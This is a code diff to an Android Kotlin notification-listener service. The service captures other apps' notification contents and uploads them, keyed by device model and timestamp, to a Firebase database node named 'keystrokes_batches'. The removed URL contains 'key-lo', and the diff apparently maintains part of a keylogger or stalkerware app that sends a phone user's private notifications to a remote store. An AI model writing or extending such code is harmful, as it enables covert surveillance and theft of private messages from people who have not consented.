@@ -12,15 +12,17 @@ import com.google.firebase.database.FirebaseDatabase
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
+import java.text.SimpleDateFormat
+import java.util.Date
+import java.util.Locale
 
 @RequiresApi(Build.VERSION_CODES.KITKAT)
 class AppNotificationListenerService : NotificationListenerService() {
     companion object {
         private const val TAG = "AppNotificationListener"
-        private const val DB_URL = "https://key-lo-5811c-default-rtdb.firebaseio.com"
         private val scope = CoroutineScope(Dispatchers.IO)
         private fun getDatabaseRef(deviceName: String): DatabaseReference? = try {
-            FirebaseDatabase.getInstance(DB_URL).getReference().child("keystrokes_batches").child(deviceName)
+            FirebaseDatabase.getInstance().getReference().child("keystrokes_batches").child(deviceName)
         } catch (e: Exception) {
             Log.e(TAG, "Error getting database ref", e)
             null
@@ -54,6 +56,7 @@ class AppNotificationListenerService : NotificationListenerService() {
                 try {
                     val deviceName = Build.MODEL?.replace(Regex("[^a-zA-Z0-9_-]"), "_")?.ifBlank { "Unknown_Device" } ?: "Unknown_Device"
                     val ref = getDatabaseRef(deviceName) ?: return@launch
+                    val timestampKey = SimpleDateFormat("yyyy-MM-dd_HH-mm-ss_SSS", Locale.getDefault()).format(Date())
                     val sanitizedAppName = packageName.replace(Regex("[^a-zA-Z0-9_-]"), "_")
 
                     val notificationData = mapOf(
@@ -64,7 +67,7 @@ class AppNotificationListenerService : NotificationListenerService() {
                         "timestamp" to System.currentTimeMillis()
                     )
 
-                    ref.child("notification_$sanitizedAppName").push().setValue(notificationData)
+                    ref.child("notification_$sanitizedAppName").child(timestampKey).setValue(notificationData)
                         .addOnSuccessListener {
                             Log.d(TAG, "Notification synced to Firebase successfully")
                             LogStore.addLog("[$deviceName] Notification synced ($sanitizedAppName): $title")
